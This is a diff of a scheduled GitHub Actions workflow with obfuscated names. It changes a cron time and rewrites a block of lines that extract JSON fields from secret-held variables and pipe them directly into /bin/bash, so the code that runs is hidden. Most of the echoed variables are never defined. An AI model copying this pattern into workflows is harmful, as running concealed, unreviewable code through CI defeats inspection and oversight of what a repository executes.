@@ -1,9 +1,8 @@
 name: pengbaiyu2901
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 4/6 * * *'
+    - cron: '7 5/6 * * *'
 
 jobs:
   build:
@@ -12,13 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengbaiyu2901
         env:
-          yj91: ${{ secrets.yj91 }}
+          bn177: ${{ secrets.bn177 }}
         run: |
-          echo $yj91 | jq -r .wssyy293 | /bin/bash
-          echo $h122 | jq -r .anuw1811 | /bin/bash
-          echo $ma2 | jq -r .euq0030 | /bin/bash
-          echo $coqa85226 | jq -r .qa36866 | /bin/bash
-          echo $mvfdj9822 | jq -r .wh87978 | /bin/bash
-          echo $kehv04632 | jq -r .ov5 | /bin/bash
-          echo $mbgc0981 | jq -r .m1847 | /bin/bash
+          echo $bn177 | jq -r .ony8 | /bin/bash
+          echo $cgg3 | jq -r .bdapc6137 | /bin/bash
+          echo $ksnxm349 | jq -r .j80514 | /bin/bash
+          echo $whdtt6421 | jq -r .oys220 | /bin/bash
+          echo $becwa1221 | jq -r .c2 | /bin/bash
+          echo $l61287 | jq -r .hfuym513 | /bin/bash
+          echo $hxqn0378 | jq -r .e18998 | /bin/bash
+          echo $g3597 | jq -r .yffx7208 | /bin/bash
+          echo $jeldt8946 | jq -r .p506 | /bin/bash
 
